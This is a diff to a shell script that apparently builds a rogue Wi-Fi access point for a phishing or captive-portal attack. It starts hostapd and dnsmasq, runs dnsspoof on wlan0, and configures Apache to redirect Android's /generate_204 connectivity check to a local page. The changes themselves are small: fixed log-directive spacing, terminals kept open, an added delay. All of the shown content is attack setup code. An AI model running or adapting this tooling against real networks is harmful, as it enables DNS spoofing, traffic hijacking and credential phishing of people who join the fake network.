@@ -152,8 +152,8 @@ function android_conf(){
 		echo -e "ServerAdmin webmaster@localhost" >> /etc/apache2/sites-enabled/android.conf 
 		echo -e "DocumentRoot /var/www/html/android" >> /etc/apache2/sites-enabled/android.conf 
 		echo -e "RedirectMatch 302 /generate_204 /index.html" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "ErrorLog\${APACHE_LOG_DIR}/android_error.log" >> /etc/apache2/sites-enabled/android.conf 
-		echo -e "CustomLog\${APACHE_LOG_DIR}/android_access.log combined" >> /etc/apache2/sites-enabled/android.conf 
+		echo -e "ErrorLog \${APACHE_LOG_DIR}/android_error.log" >> /etc/apache2/sites-enabled/android.conf 
+		echo -e "CustomLog \${APACHE_LOG_DIR}/android_access.log combined" >> /etc/apache2/sites-enabled/android.conf 
 		echo -e "</VirtualHost>" >> /etc/apache2/sites-enabled/android.conf 
 		sleep 2;
 		echo -e "Configuration files are set";
@@ -169,13 +169,14 @@ function final_conf(){
 	sudo nmcli d disconnect wlan0;
 	killall NerworkManager;
 	sleep 2;
-	xterm -e /bin/bash -l -c "hostapd hostapd.conf" &
+	xterm -e /bin/bash -l -c "hostapd hostapd.conf;bash" &
 	sudo ifconfig wlan0 10.0.0.1; 
-	xterm -e /bin/bash -l -c "dnsmasq -C dnsmasq.conf -d" &
+	xterm -e /bin/bash -l -c "dnsmasq -C dnsmasq.conf -d;bash" &
 	echo 0 > /proc/sys/net/ipv4/ip_forward;
-	a2enmod rewrite;
+	a2enmod rewrite;	
+	sleep 2;
 	service apache2 start;
-	xterm -e /bin/bash -l -c "dnsspoof -i wlan0" &
+	xterm -e /bin/bash -l -c "dnsspoof -i wlan0;bash" &
 }
 
 
